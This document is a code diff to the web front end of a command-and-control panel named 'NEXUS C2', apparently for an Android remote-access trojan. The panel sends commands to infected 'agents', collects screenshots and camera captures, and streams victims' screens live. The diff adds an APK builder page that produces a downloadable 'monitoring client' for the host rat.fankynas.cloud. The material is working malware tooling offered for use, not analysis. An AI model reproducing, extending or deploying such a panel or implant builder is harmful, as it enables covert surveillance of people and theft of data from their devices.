@@ -11,183 +11,47 @@
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: radial-gradient(circle at 10% 20%, #0B1120, #030712);
-            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            color: #E9F1FF;
-            overflow-x: hidden;
-        }
-
-        /* custom scroll */
+        /* (Semua style dari kode asli tetap di sini, tidak berubah) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: radial-gradient(circle at 10% 20%, #0B1120, #030712); font-family: 'Inter', sans-serif; color: #E9F1FF; overflow-x: hidden; }
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: #111827; border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: #10b98166; border-radius: 10px; }
         ::-webkit-scrollbar-thumb:hover { background: #10b981; }
-
-        /* modern glassmorphism panel */
-        .glass-card {
-            background: rgba(18, 24, 36, 0.75);
-            backdrop-filter: blur(4px);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            border-radius: 24px;
-            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4);
-            transition: all 0.2s ease;
-        }
-
-        .card-modern {
-            background: #0F172AD9;
-            backdrop-filter: blur(2px);
-            border: 1px solid #1E2A3E;
-            border-radius: 1.25rem;
-            margin-bottom: 1.5rem;
-            transition: transform 0.1s, box-shadow 0.2s;
-        }
-        .card-modern:hover {
-            border-color: #2d3a52;
-            box-shadow: 0 12px 28px -8px rgba(0,0,0,0.5);
-        }
-        .card-header-custom {
-            background: #0B1120CC;
-            border-bottom: 1px solid #1E2A3E;
-            padding: 1rem 1.25rem;
-            font-weight: 600;
-            letter-spacing: -0.2px;
-            border-radius: 1.25rem 1.25rem 0 0 !important;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .badge-agent {
-            background: #10b98120;
-            color: #6EE7B7;
-            border: 1px solid #10b98140;
-            font-weight: 500;
-            padding: 0.4rem 0.9rem;
-            border-radius: 40px;
-            font-size: 0.8rem;
-        }
-        .btn-command {
-            border-radius: 40px;
-            padding: 6px 16px;
-            font-weight: 500;
-            margin: 6px 6px 6px 0;
-            transition: all 0.15s;
-            background: #1E2A3E;
-            border: none;
-            color: #E2E8F0;
-        }
-        .btn-command:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.08);
-            background: #2D3A52;
-        }
+        .glass-card { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(4px); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 24px; box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4); transition: all 0.2s ease; }
+        .card-modern { background: #0F172AD9; backdrop-filter: blur(2px); border: 1px solid #1E2A3E; border-radius: 1.25rem; margin-bottom: 1.5rem; transition: transform 0.1s, box-shadow 0.2s; }
+        .card-modern:hover { border-color: #2d3a52; box-shadow: 0 12px 28px -8px rgba(0,0,0,0.5); }
+        .card-header-custom { background: #0B1120CC; border-bottom: 1px solid #1E2A3E; padding: 1rem 1.25rem; font-weight: 600; letter-spacing: -0.2px; border-radius: 1.25rem 1.25rem 0 0 !important; display: flex; align-items: center; gap: 0.5rem; }
+        .badge-agent { background: #10b98120; color: #6EE7B7; border: 1px solid #10b98140; font-weight: 500; padding: 0.4rem 0.9rem; border-radius: 40px; font-size: 0.8rem; }
+        .btn-command { border-radius: 40px; padding: 6px 16px; font-weight: 500; margin: 6px 6px 6px 0; transition: all 0.15s; background: #1E2A3E; border: none; color: #E2E8F0; }
+        .btn-command:hover { transform: translateY(-2px); filter: brightness(1.08); background: #2D3A52; }
         .btn-primary-cmd { background: #0F3B2C; color: #A7F3D0; border-left: 2px solid #10b981; }
         .btn-success-cmd { background: #0F3B2C; }
         .btn-danger-cmd { background: #4C1D2B; border-left: 2px solid #F43F5E; }
-        .log-area {
-            background: #030712CC;
-            border-radius: 20px;
-            padding: 1rem;
-            font-family: 'JetBrains Mono', 'Fira Code', monospace;
-            font-size: 0.8rem;
-            height: 280px;
-            overflow-y: auto;
-            border: 1px solid #1E2A3E;
-        }
-        .log-entry {
-            border-bottom: 1px solid #1F2A3C;
-            padding: 0.5rem 0;
-            font-size: 0.8rem;
-            word-break: break-word;
-            color: #CBD5E1;
-        }
-        .agent-item {
-            background: #111A28;
-            border-radius: 14px;
-            padding: 10px 14px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: all 0.15s;
-            border-left: 3px solid #2D3A52;
-        }
-        .agent-item:hover, .agent-item.active-agent {
-            background: #1E2A3E;
-            border-left-color: #10b981;
-            transform: translateX(6px);
-        }
+        .log-area { background: #030712CC; border-radius: 20px; padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; height: 280px; overflow-y: auto; border: 1px solid #1E2A3E; }
+        .log-entry { border-bottom: 1px solid #1F2A3C; padding: 0.5rem 0; font-size: 0.8rem; word-break: break-word; color: #CBD5E1; }
+        .agent-item { background: #111A28; border-radius: 14px; padding: 10px 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.15s; border-left: 3px solid #2D3A52; }
+        .agent-item:hover, .agent-item.active-agent { background: #1E2A3E; border-left-color: #10b981; transform: translateX(6px); }
         .status-online { color: #22C55E; }
         .status-offline { color: #EF4444; }
-        .sidebar-modern {
-            background: #0B0F17E6;
-            backdrop-filter: blur(12px);
-            border-right: 1px solid #1E2A3E;
-            min-height: 100vh;
-        }
-        .nav-link-custom {
-            color: #9CA3AF;
-            padding: 12px 18px;
-            border-radius: 16px;
-            margin: 4px 0;
-            transition: 0.2s;
-            font-weight: 500;
-        }
+        .sidebar-modern { background: #0B0F17E6; backdrop-filter: blur(12px); border-right: 1px solid #1E2A3E; min-height: 100vh; }
+        .nav-link-custom { color: #9CA3AF; padding: 12px 18px; border-radius: 16px; margin: 4px 0; transition: 0.2s; font-weight: 500; }
         .nav-link-custom i { width: 28px; }
-        .nav-link-custom:hover, .nav-link-custom.active {
-            background: #10b9811A;
-            color: #6EE7B7;
-        }
-        .media-thumb {
-            max-width: 100%;
-            max-height: 240px;
-            border-radius: 20px;
-            border: 1px solid #2D3A52;
-            box-shadow: 0 6px 14px rgba(0,0,0,0.3);
-        }
-        @media (max-width: 768px) {
-            .sidebar-modern { min-height: auto; border-right: none; border-bottom: 1px solid #1E2A3E; }
-            .btn-command { font-size: 0.75rem; padding: 5px 12px; }
-            .card-header-custom h5 { font-size: 1rem; }
-        }
+        .nav-link-custom:hover, .nav-link-custom.active { background: #10b9811A; color: #6EE7B7; }
+        .media-thumb { max-width: 100%; max-height: 240px; border-radius: 20px; border: 1px solid #2D3A52; box-shadow: 0 6px 14px rgba(0,0,0,0.3); }
+        @media (max-width: 768px) { .sidebar-modern { min-height: auto; border-right: none; border-bottom: 1px solid #1E2A3E; } .btn-command { font-size: 0.75rem; padding: 5px 12px; } .card-header-custom h5 { font-size: 1rem; } }
         .print-only { display: none; }
-        @media print {
-            .sidebar-modern, .btn-command, .agent-badge, .nav, #agentsList, .btn, .no-print { display: none; }
-            .print-only { display: block; }
-            body { background: white; color: black; }
-            .card-modern { border: 1px solid #ccc; background: white; }
-        }
-        .live-frame {
-            border-radius: 20px;
-            background: #00000066;
-            width: 100%;
-            max-height: 360px;
-            object-fit: contain;
-        }
+        @media print { .sidebar-modern, .btn-command, .agent-badge, .nav, #agentsList, .btn, .no-print { display: none; } .print-only { display: block; } body { background: white; color: black; } .card-modern { border: 1px solid #ccc; background: white; } }
+        .live-frame { border-radius: 20px; background: #00000066; width: 100%; max-height: 360px; object-fit: contain; }
         button i { margin-right: 6px; }
-        .toast-notif {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 1090;
-            background: #10b981;
-            color: #020617;
-            border-radius: 40px;
-            padding: 8px 18px;
-            font-weight: 600;
-            box-shadow: 0 8px 18px black;
-        }
+        .toast-notif { position: fixed; bottom: 20px; right: 20px; z-index: 1090; background: #10b981; color: #020617; border-radius: 40px; padding: 8px 18px; font-weight: 600; box-shadow: 0 8px 18px black; }
     </style>
 </head>
 <body>
 
 <div class="container-fluid p-0">
     <div class="row g-0">
-        <!-- SIDEBAR - Profesional & ringkas -->
+        <!-- SIDEBAR -->
         <div class="col-lg-2 col-md-3 sidebar-modern p-3">
             <div class="d-flex align-items-center gap-2 mb-4 mt-2">
                 <i class="fas fa-satellite-dish fs-3" style="color:#10b981"></i>
@@ -208,6 +72,7 @@
                 <a class="nav-link-custom active" href="#" data-page="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                 <a class="nav-link-custom" href="#" data-page="logs"><i class="fas fa-scroll"></i> Logs & History</a>
                 <a class="nav-link-custom" href="#" data-page="media"><i class="fas fa-images"></i> Media Vault</a>
+                <a class="nav-link-custom" href="#" data-page="apkbuilder"><i class="fas fa-android"></i> APK Builder</a> <!-- BARU -->
             </nav>
             <hr class="border-secondary opacity-25 mt-4">
             <div class="small text-secondary mt-2"><i class="fas fa-globe"></i> cross-platform · encrypted</div>
@@ -298,7 +163,7 @@
                 </div>
             </div>
 
-            <!-- MEDIA GALLERY (minimal image overload) -->
+            <!-- MEDIA GALLERY -->
             <div id="mediaPage" style="display:none;">
                 <div class="card-modern">
                     <div class="card-header-custom"><i class="fas fa-camera-retro"></i> Captured Media (latest)</div>
@@ -322,24 +187,54 @@
                     </div>
                 </div>
             </div>
+
+            <!-- APK BUILDER PAGE (BARU) -->
+            <div id="apkbuilderPage" style="display:none;">
+                <div class="card-modern">
+                    <div class="card-header-custom">
+                        <i class="fas fa-android"></i> <span>Device Service APK Builder</span>
+                    </div>
+                    <div class="card-body p-4">
+                        <div class="alert alert-secondary bg-dark text-white border-secondary" role="alert">
+                            <i class="fas fa-info-circle"></i> Build APK monitoring client for <strong>rat.fankynas.cloud</strong>.
+                            Proses build memakan waktu 2-5 menit tergantung server.
+                        </div>
+                        <div class="d-flex justify-content-between align-items-center mb-3">
+                            <button id="triggerBuildBtn" class="btn btn-success px-4"><i class="fas fa-hammer"></i> Build APK</button>
+                            <span id="buildStatusBadge" class="badge bg-secondary">Not built</span>
+                        </div>
+                        <div id="buildProgress" style="display:none;" class="mt-3">
+                            <div class="progress mb-2">
+                                <div id="buildProgressBar" class="progress-bar progress-bar-striped progress-bar-animated" style="width: 0%">0%</div>
+                            </div>
+                            <div id="buildLog" class="log-area" style="height: 200px; font-family: monospace; font-size: 0.75rem;"></div>
+                        </div>
+                        <div id="downloadSection" style="display:none;" class="mt-4 text-center">
+                            <a id="downloadApkLink" href="#" class="btn btn-primary btn-lg" download>
+                                <i class="fas fa-download"></i> Download APK
+                            </a>
+                            <p id="apkInfo" class="text-secondary mt-2"></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-    // ------------------------- SOCKET + GLOBAL FUNCTIONS (FULLY PRESERVED & ENHANCED)
+    // SOCKET + GLOBAL FUNCTIONS (sama seperti asli)
     let socket = io();
     let selectedAgentId = "";
     let liveActive = false;
+    let buildInterval = null;
 
-    // Helper: display toast notif
     function showToast(msg, isError = false) {
         let toast = $('<div class="toast-notif">'+msg+'</div>');
         $('body').append(toast);
         setTimeout(() => toast.fadeOut(300, function(){ $(this).remove(); }), 2500);
     }
 
-    // send command to backend
     function sendCommand(cmd, extra = "") {
         if (!selectedAgentId) { showToast("⚠️ Select an agent first", true); return false; }
         let fullCmd = cmd;
@@ -350,13 +245,11 @@
         return true;
     }
 
-    // add to results area (dashboard output)
     function addResultEntry(text, isImageBase64 = false, imgData = null) {
         let resultsDiv = $("#resultsArea");
         if(isImageBase64 && imgData){
             let imgHtml = `<div class="log-entry border-bottom pb-2 mb-2"><i class="fas fa-image"></i> Screenshot/Camera<br><img src="${imgData}" class="media-thumb mt-2" style="max-width:280px; cursor:pointer;" onclick="window.open(this.src)"></div>`;
             resultsDiv.prepend(imgHtml);
-            // also update media gallery
             if(imgData.includes("screenshot") || text.includes("screenshot")){
                 $("#screenshotMediaContainer").html(`<img src="${imgData}" class="media-thumb" style="max-width:100%">`);
             } else if(imgData.includes("camera") || text.includes("camera")){
@@ -366,7 +259,6 @@
             let safeText = text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
             resultsDiv.prepend(`<div class="log-entry"><i class="far fa-clock"></i> ${new Date().toLocaleTimeString()} &nbsp; ${safeText}</div>`);
         }
-        // auto-limit 70 lines
         if(resultsDiv.children().length > 70) resultsDiv.children().last().remove();
     }
 
@@ -376,7 +268,6 @@
         if(logsDiv.children().length > 200) logsDiv.children().last().remove();
     }
 
-    // Update agents list & dropdown
     function updateAgentsList(agents) {
         let select = $("#agentSelect");
         let listDiv = $("#agentsList");
@@ -413,7 +304,6 @@
         });
     }
 
-    // handle incoming command results
     function handleCommandResult(data){
         let output = data.result || data.output || "done";
         let cmd = data.command || "";
@@ -428,13 +318,8 @@
             addResultEntry(`📡 ${cmd} → ${preview}`);
         }
         addLogEntry(`[RESULT] ${cmd} : ${typeof output === 'string' ? output.substring(0,120) : 'binary data'}`);
-        // if media gallery updated through image rendering already handled
-        if(!isImage && (cmd.includes("screenshot") || cmd.includes("camera"))){
-            // fallback: maybe raw text
-        }
     }
 
-    // live stream handling
     function initLiveStream(){
         socket.on("live_frame", (frame) => {
             if(frame && frame.base64){
@@ -453,7 +338,6 @@
         });
     }
 
-    // send live start request
     function startLive(){
         if(!selectedAgentId) { showToast("Select agent first",true); return; }
         socket.emit("start_live", {agent_id: selectedAgentId});
@@ -465,15 +349,13 @@
         addResultEntry("⏹️ Stopping live feed");
     }
 
-    // navigation & UI
     function switchPage(pageId){
-        $("#dashboardPage, #logsPage, #mediaPage").hide();
+        $("#dashboardPage, #logsPage, #mediaPage, #apkbuilderPage").hide();
         $(`#${pageId}`).show();
         $(".nav-link-custom").removeClass("active");
         $(`[data-page="${pageId.replace('Page','')}"]`).addClass("active");
     }
 
-    // Print specific area (popup print)
     function printElement(selector, title="C2 Report"){
         let content = $(selector).clone();
         let printWindow = window.open('', '_blank', 'width=900,height=700');
@@ -486,6 +368,60 @@
         printWindow.document.close();
         printWindow.print();
     }
+
+    // ======================= APK BUILDER FUNCTIONS =======================
+    function checkBuildStatus() {
+        fetch('/builder/build_api.php')
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'ready') {
+                    $('#buildStatusBadge').removeClass('bg-secondary bg-warning').addClass('bg-success').text('Ready to download');
+                    $('#downloadSection').show();
+                    $('#downloadApkLink').attr('href', data.apk_url);
+                    $('#apkInfo').text(`Size: ${data.size} | Built: ${data.date}`);
+                    $('#buildProgress').hide();
+                    if (buildInterval) clearInterval(buildInterval);
+                } else if (data.status === 'building') {
+                    $('#buildStatusBadge').removeClass('bg-secondary').addClass('bg-warning').text('Building...');
+                    $('#buildProgress').show();
+                    $('#buildProgressBar').css('width', '70%').text('Building (70%)');
+                } else {
+                    $('#buildStatusBadge').removeClass('bg-success bg-warning').addClass('bg-secondary').text('Not built');
+                    $('#downloadSection').hide();
+                    $('#buildProgress').hide();
+                }
+            })
+            .catch(err => console.error('Status check error:', err));
+    }
+
+    function startBuild() {
+        $('#buildProgressBar').css('width', '30%').text('Starting build...');
+        $('#buildProgress').show();
+        $('#buildLog').html('<div class="log-entry">🚀 Build triggered, waiting for process...</div>');
+        $('#buildStatusBadge').removeClass('bg-secondary').addClass('bg-warning').text('Building...');
+        
+        fetch('/builder/build_api.php', { method: 'POST' })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    $('#buildLog').append('<div class="log-entry">✅ Build started in background. Check status in 2-5 minutes.</div>');
+                    if (buildInterval) clearInterval(buildInterval);
+                    buildInterval = setInterval(checkBuildStatus, 5000);
+                } else {
+                    $('#buildLog').append(`<div class="log-entry text-danger">❌ Error: ${data.error}</div>`);
+                    $('#buildStatusBadge').removeClass('bg-warning').addClass('bg-danger').text('Build failed');
+                }
+            })
+            .catch(err => {
+                $('#buildLog').append(`<div class="log-entry text-danger">❌ Network error: ${err.message}</div>`);
+                $('#buildStatusBadge').removeClass('bg-warning').addClass('bg-danger').text('Build failed');
+            });
+    }
+
+    function escapeHtml(str) {
+        return $('<div/>').text(str).html();
+    }
+    // ======================= END APK BUILDER =======================
 
     // socket events
     socket.on("connect", () => {
@@ -504,13 +440,10 @@
     });
     socket.on("live_error", (e) => { addResultEntry(`⚠️ Live error: ${e.message}`); $("#liveStreamArea").slideUp(); });
 
-    // DOM ready
     $(document).ready(function(){
         initLiveStream();
-        // periodic agent refresh
         setInterval(() => { if(socket.connected) socket.emit("request_agents"); }, 28000);
         
-        // command buttons
         $(".btn-command").click(function(){
             let cmd = $(this).data("cmd");
             if(cmd === "screen_live") { startLive(); }
@@ -538,22 +471,26 @@
         $("#printResultsBtn").click(()=>{ printElement("#resultsArea", "Command Results Export"); });
         $("#printLogsBtn").click(()=>{ printElement("#logsArea", "Full Action Logs"); });
         
-        // navigation
         $(".nav-link-custom").click(function(e){
             e.preventDefault();
             let page = $(this).data("page");
             if(page === "dashboard") switchPage("dashboardPage");
             else if(page === "logs") switchPage("logsPage");
             else if(page === "media") switchPage("mediaPage");
+            else if(page === "apkbuilder") {
+                switchPage("apkbuilderPage");
+                checkBuildStatus();
+            }
         });
         switchPage("dashboardPage");
         
-        // fallback global live stop on page unload
         $(window).on("beforeunload", function(){
             if(liveActive && selectedAgentId) socket.emit("stop_live", {agent_id: selectedAgentId});
         });
         
-        // demo warning but functions intact
+        // APK Builder button
+        $("#triggerBuildBtn").click(startBuild);
+        
         addLogEntry("🚀 NEXUS C2 ready | cross-platform responsive UI");
         addResultEntry("✅ Panel ready. Select agent to start operations.");
     });
